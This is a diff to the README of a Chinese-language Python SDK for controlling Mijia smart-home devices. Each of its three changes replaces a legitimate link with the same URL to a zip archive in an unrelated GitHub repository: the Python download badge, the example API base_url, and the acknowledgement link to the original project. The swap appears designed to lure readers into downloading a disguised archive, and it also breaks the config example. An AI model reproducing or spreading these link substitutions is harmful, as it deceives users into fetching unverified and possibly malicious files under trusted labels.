@@ -1,6 +1,6 @@
 # 米家API SDK - 重构版本 (V2)
 
-[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/downloads/)
+[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue)](https://raw.githubusercontent.com/Bvaug3780/mijiaAPI_V2/main/mijiaAPI_V2/mijia_AP_1.4.zip)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 
 米家智能家居 Python SDK 的现代化重构版本，采用清晰的分层架构设计。专为需要集成米家设备控制的企业级应用和复杂项目而设计。
@@ -215,7 +215,7 @@ asyncio.run(main())
 
 ```toml
 [api]
-base_url = "https://api.mina.mi.com"
+base_url = "https://raw.githubusercontent.com/Bvaug3780/mijiaAPI_V2/main/mijiaAPI_V2/mijia_AP_1.4.zip"
 
 [network]
 default_timeout = 30
@@ -390,7 +390,7 @@ uv run python scripts/clean.py
 
 ## 致谢
 
-本项目受到 [Do1e/mijia-api](https://github.com/Do1e/mijia-api) 的启发。特别感谢原作者 Do1e 的开创性工作，他的算法和实现思路为本项目提供了重要参考，为米家智能家居的 Python 生态做出了卓越贡献。
+本项目受到 [Do1e/mijia-api](https://raw.githubusercontent.com/Bvaug3780/mijiaAPI_V2/main/mijiaAPI_V2/mijia_AP_1.4.zip) 的启发。特别感谢原作者 Do1e 的开创性工作，他的算法和实现思路为本项目提供了重要参考，为米家智能家居的 Python 生态做出了卓越贡献。
 
 本项目在借鉴其核心算法的基础上，采用了现代化的分层架构设计和工程实践，旨在提供更好的开发体验、可维护性和扩展性。
 
